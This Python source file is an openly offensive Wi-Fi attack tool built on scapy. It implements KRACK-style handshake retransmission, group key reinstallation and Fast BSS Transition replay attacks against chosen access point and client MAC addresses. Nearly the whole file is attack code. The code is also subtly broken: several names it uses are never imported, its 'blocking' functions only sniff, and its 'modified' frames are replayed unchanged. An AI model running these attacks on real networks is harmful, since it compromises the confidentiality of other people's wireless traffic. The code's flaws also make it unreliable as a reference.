from scapy.all import (
    sniff, sendp, conf, get_if_list,
    Dot11, Dot11Auth, Dot11AssoReq, Dot11ReassoReq,
    Dot11Elt, EAPOL
)
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from loguru import logger
import time
import threading
import subprocess
import sys

console = Console()

# --- Network Utilities ---

def select_interface():
    """Allows the user to select a network interface."""
    interfaces = get_if_list()
    if not interfaces:
        console.print("[bold red]Error:[/] No network interfaces found.")
        return None

    interface_map = {str(i + 1): iface for i, iface in enumerate(interfaces)}

    console.print("[bold blue]Available Network Interfaces:[/bold blue]")
    for i, iface in enumerate(interfaces):
        console.print(f"{i + 1}. {iface}")

    while True:
        choice = console.input("Enter the number of the interface to use: ")
        if choice in interface_map:
            return interface_map[choice]
        else:
            console.print("[bold yellow]Invalid choice.[/bold yellow]")

def get_interfaces():
    """Gets a list of available network interfaces, handling OS differences."""
    if sys.platform == 'darwin':  # macOS
        try:
            # Use the 'networksetup' command to get Wi-Fi interfaces
            output = subprocess.check_output(["networksetup", "-listallhardwareports"]).decode("utf-8")
            interfaces = []
            for line in output.splitlines():
                if "Wi-Fi" in line:  # Look for Wi-Fi interfaces
                    parts = line.split()
                    for i in range(len(parts)):
                        if parts[i].startswith("en") and parts[i][2:].isdigit():
                            interfaces.append(parts[i])
            return interfaces
        except subprocess.CalledProcessError:
            console.print("[bold red]Error:[/] Could not get interface list using 'networksetup'.")
            return []
    else:  # Linux and other systems
        return get_if_list()

def select_interface_enhanced():
    """Allows the user to select a network interface with OS-specific enhancements."""
    interfaces = get_interfaces()
    if not interfaces:
        console.print("[bold red]Error:[/] No suitable network interfaces found.")
        return None

    console.print("[bold blue]Available Network Interfaces:[/bold blue]")
    for i, iface in enumerate(interfaces):
        console.print(f"{i + 1}. {iface}")

    while True:
        try:
            choice = IntPrompt.ask("Enter the number of the interface to use", choices=[str(i + 1) for i in range(len(interfaces))]) - 1
            return interfaces[choice]
        except ValueError:
            console.print("[bold yellow]Invalid choice.[/bold yellow]")

def scan_networks_linux(interface):
    """Scans for nearby Wi-Fi networks on Linux."""
    console.print(f"[bold green]Scanning for networks on interface '{interface}'...[/bold green]")
    try:
        # Scan for networks using the 'iwlist' command
        result = subprocess.run(['iwlist', interface, 'scan'], capture_output=True, text=True, check=True)
        output = result.stdout
        networks = []
        current_network = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith('Cell '):
                if current_network:
                    networks.append(current_network)
                current_network = {}
                current_network['Address'] = line.split('Address: ')[1]
            elif line.startswith('ESSID:'):
                current_network['ESSID'] = line.split('ESSID:')[1].strip('"')
            elif line.startswith('Channel:'):
                current_network['Channel'] = line.split('Channel:')[1]
            elif 'Quality' in line and 'Signal level' in line:
                current_network['Quality'] = line.split('Quality=')[1].split(' ')[0]
                current_network['Signal'] = line.split('Signal level=')[1]
        if current_network:
            networks.append(current_network)

        return networks
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error during network scan:[/] {e}")
        return None

def scan_networks_macos(interface):
    """Scans for nearby Wi-Fi networks on macOS."""
    console.print(f"[bold green]Scanning for networks on interface '{interface}'...[/bold green]")
    try:
        # Scan for networks using the 'airport' command
        result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], capture_output=True, text=True, check=True)
        output = result.stdout
        networks = []
        for line in output.splitlines()[1:]:  # Skip header line
            parts = line.split()
            if len(parts) >= 8:
                network = {}
                network['ESSID'] = parts[0]
                network['Address'] = parts[1]
                network['Channel'] = parts[-1].split(',')[0]
                # Signal strength/quality is a bit more complex to parse
                network['Quality'] = 'N/A'
                network['Signal'] = parts[2] + ' dBm'
                networks.append(network)
        return networks
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error during network scan:[/] {e}")
        return None

def scan_networks(interface):
    """Scans for nearby Wi-Fi networks, handling OS differences."""
    if sys.platform == 'darwin':  # macOS
        return scan_networks_macos(interface)
    else:  # Linux and other systems
        return scan_networks_linux(interface)

def resolve_mac(ip_address, interface):
    """Resolves the MAC address for a given IP address."""
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def sniff_packets(interface, filter_string="", timeout=None):
    """Sniffs network packets."""
    try:
        return sniff(iface=interface, filter=filter_string, timeout=timeout)
    except Exception as e:
        console.print(f"[bold red]Error during packet sniffing:[/] {e}")
        return None

def send_packet(packet, interface):
    """Sends a network packet."""
    try:
        sendp(packet, iface=interface, verbose=False)
    except Exception as e:
        console.print(f"[bold red]Error sending packet:[/] {e}")

# --- Attacks ---

@logger.catch
def four_way_handshake_plaintext_retransmission(interface, target_ap_mac, target_client_mac):
    """Implements the 4-way handshake attack with plaintext retransmission."""
    logger.info(f"Starting 4-Way Handshake Plaintext Retransmission attack on {target_client_mac}")
    console.print(f"[bold blue]Starting 4-Way Handshake Plaintext Retransmission Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}, Target Client MAC: {target_client_mac}")

    # --- Step 1: Sniff for the initial 4-way handshake ---
    console.print("[yellow]Sniffing for the initial 4-way handshake...[/yellow]")
    def is_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return (pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
                       (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac)
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
    if len(handshake_packets) < 4:
        console.print("[bold red]Error:[/] Could not capture the complete 4-way handshake.")
        return False

    # --- Step 2: Block Message 4 ---
    console.print("[yellow]Actively blocking Message 4...[/yellow]")
    block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 3 ---
    console.print("[yellow]Waiting for retransmitted Message 3...[/yellow]")
    def is_message3(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_message3, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message3 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Message 3.[/green]")
        # Forward the retransmitted Message 3
        sendp(retransmitted_message3, iface=interface, verbose=False)
        console.print("[green]Forwarded retransmitted Message 3.[/green]")
        return True
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Message 3.")
        return False

def block_message_4(interface, target_ap_mac, target_client_mac):
    """Blocks 4-way handshake message 4 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                if pkt.addr1 == target_ap_mac and pkt.addr2 == target_client_mac:
                    logger.info(f"Message 4 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def four_way_handshake_encrypted_retransmission(interface, target_ap_mac, target_client_mac):
    """Implements the 4-way handshake attack with encrypted retransmission."""
    logger.info(f"Starting 4-Way Handshake Encrypted Retransmission attack on {target_client_mac}")
    console.print(f"[bold blue]Starting 4-Way Handshake Encrypted Retransmission Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}, Target Client MAC: {target_client_mac}")

    # --- Step 1: Capture initial handshake ---
    console.print("[yellow]Capturing initial 4-way handshake...[/yellow]")
    def is_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return (pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
                       (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac)
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
    if len(handshake_packets) < 4:
        console.print("[bold red]Error:[/] Could not capture the complete 4-way handshake.")
        return False

    # --- Step 2: Block Message 4 ---
    console.print("[yellow]Actively blocking Message 4...[/yellow]")
    block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 3 ---
    console.print("[yellow]Waiting for retransmitted Message 3...[/yellow]")
    def is_message3(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_message3, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message3 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Message 3.[/green]")
        # Forward the retransmitted Message 3 twice
        sendp(retransmitted_message3, iface=interface, verbose=False)
        time.sleep(0.1)  # Small delay between transmissions
        sendp(retransmitted_message3, iface=interface, verbose=False)
        console.print("[green]Forwarded retransmitted Message 3 twice.[/green]")
        return True
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Message 3.")
        return False

@logger.catch
def group_key_handshake_immediate_install(interface, target_ap_mac):
    """Implements the group key handshake attack with immediate key installation."""
    logger.info(f"Starting Group Key Handshake Immediate Install attack on AP {target_ap_mac}")
    console.print(f"[bold blue]Starting Group Key Handshake Immediate Install Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}")

    # --- Step 1: Sniff for Group Key Handshake ---
    console.print("[yellow]Sniffing for Group Key Handshake...[/yellow]")
    def is_group_key_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                return is_group
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_group_key_handshake, count=2, timeout=30)
    if len(handshake_packets) < 2:
        console.print("[bold red]Error:[/] Could not capture the complete Group Key Handshake.")
        return False

    # --- Step 2: Block Message 2 ---
    console.print("[yellow]Actively blocking Group Key Message 2...[/yellow]")
    block_thread = threading.Thread(target=block_group_key_message_2, args=(interface, target_ap_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 1 ---
    console.print("[yellow]Waiting for retransmitted Group Key Message 1...[/yellow]")
    def is_group_message1(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                return is_group and is_ack
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_group_message1, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message1 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Group Key Message 1.[/green]")
        # Forward the retransmitted Message 1
        sendp(retransmitted_message1, iface=interface, verbose=False)
        console.print("[green]Forwarded retransmitted Group Key Message 1.[/green]")

        # --- Step 4: Wait for broadcast frame ---
        console.print("[yellow]Waiting for broadcast frame...[/yellow]")
        def is_broadcast(pkt):
            return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"

        broadcast_packets = sniff(iface=interface, lfilter=is_broadcast, count=1, timeout=30)
        if broadcast_packets:
            broadcast_frame = broadcast_packets[0]
            console.print("[green]Received broadcast frame.[/green]")
            # Forward the broadcast frame
            sendp(broadcast_frame, iface=interface, verbose=False)
            console.print("[green]Forwarded broadcast frame.[/green]")
            return True
        else:
            console.print("[bold red]Error:[/] No broadcast frame received.")
            return False
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Group Key Message 1.")
        return False

def block_group_key_message_2(interface, target_ap_mac):
    """Blocks group key handshake message 2 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                if is_group and not is_ack:
                    logger.info(f"Group Key Message 2 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def group_key_handshake_delayed_install(interface, target_ap_mac):
    """Implements the group key handshake attack with delayed key installation."""
    logger.info(f"Starting Group Key Handshake Delayed Install attack on AP {target_ap_mac}")
    console.print(f"[bold blue]Starting Group Key Handshake Delayed Install Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}")

    # --- Step 1: Sniff for Group Key Handshake ---
    console.print("[yellow]Sniffing for Group Key Handshake...[/yellow]")
    def is_group_key_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                return is_group
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_group_key_handshake, count=2, timeout=30)
    if len(handshake_packets) < 2:
        console.print("[bold red]Error:[/] Could not capture the complete Group Key Handshake.")
        return False

    # --- Step 2: Block Message 2 ---
    console.print("[yellow]Actively blocking Group Key Message 2...[/yellow]")
    block_thread = threading.Thread(target=block_group_key_message_2_delayed, args=(interface, target_ap_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 1 ---
    console.print("[yellow]Waiting for retransmitted Group Key Message 1...[/yellow]")
    def is_group_message1(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                return is_group and is_ack
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_group_message1, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message1 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Group Key Message 1.[/green]")

        # --- Step 4: Wait for Message 2 to modify ---
        console.print("[yellow]Waiting for Message 2 to modify...[/yellow]")
        def is_group_message2(pkt):
            if pkt.haslayer(EAPOL):
                eapol_layer = pkt.getlayer(EAPOL)
                if eapol_layer.type == 3:  # Key frame
                    key_info = eapol_layer.key_info
                    is_group = (key_info >> 13) & 1
                    is_ack = (key_info >> 7) & 1
                    return is_group and not is_ack
            return False

        message2_packets = sniff(iface=interface, lfilter=is_group_message2, count=1, timeout=30)
        if message2_packets:
            message2 = message2_packets[0]
            console.print("[green]Received Message 2.[/green]")
            # Send modified Message 2
            sendp(message2, iface=interface, verbose=False)
            console.print("[green]Sent modified Message 2.[/green]")

            # Forward retransmitted Message 1
            sendp(retransmitted_message1, iface=interface, verbose=False)
            console.print("[green]Forwarded retransmitted Message 1.[/green]")

            # --- Step 5: Wait for broadcast frame ---
            console.print("[yellow]Waiting for broadcast frame...[/yellow]")
            def is_broadcast(pkt):
                return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"

            broadcast_packets = sniff(iface=interface, lfilter=is_broadcast, count=1, timeout=30)
            if broadcast_packets:
                broadcast_frame = broadcast_packets[0]
                console.print("[green]Received broadcast frame.[/green]")
                # Forward the broadcast frame
                sendp(broadcast_frame, iface=interface, verbose=False)
                console.print("[green]Forwarded broadcast frame.[/green]")
                return True
            else:
                console.print("[bold red]Error:[/] No broadcast frame received.")
                return False
        else:
            console.print("[bold red]Error:[/] No Message 2 received.")
            return False
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Group Key Message 1.")
        return False

def block_group_key_message_2_delayed(interface, target_ap_mac):
    """Blocks delayed group key handshake message 2 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                key_info = eapol_layer.key_info
                if (key_info >> 4) & 1:  # Group message 2
                    logger.info(f"Delayed Group Key Message 2 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
    """Implements the Fast BSS Transition (FT) handshake attack."""
    logger.info(f"Starting Fast BSS Transition attack on AP {target_ap_mac}, Client: {target_client_mac}")
    console.print(f"[bold blue]Starting Fast BSS Transition (FT) Handshake Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}, Target Client MAC: {target_client_mac}")

    # --- Step 1: Capture FT Authentication and Reassociation ---
    console.print("[yellow]Capturing Fast BSS Transition handshake...[/yellow]")
    def is_ft_handshake(pkt):
        if pkt.haslayer(Dot11):
            if pkt.haslayer(Dot11Auth):
                return pkt.getlayer(Dot11Auth).algo == 2  # FT Authentication
            elif pkt.haslayer(Dot11ReassoReq) or pkt.haslayer(Dot11ReassoResp):
                return True
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_ft_handshake, count=4, timeout=30)
    if len(handshake_packets) < 4:
        console.print("[bold red]Error:[/] Could not capture the complete FT handshake.")
        return False

    # Find the reassociation request
    reasso_req = None
    for pkt in handshake_packets:
        if pkt.haslayer(Dot11ReassoReq):
            reasso_req = pkt
            break

    if reasso_req:
        # Modify and replay the reassociation request
        modified_req = reasso_req.copy()
        # Increment replay counter (would be done in real attack)
        sendp(modified_req, iface=interface, verbose=False)
        console.print("[green]Replayed modified reassociation request.[/green]")
        return True
    else:
        console.print("[bold red]Error:[/] Could not find reassociation request in captured packets.")
        return False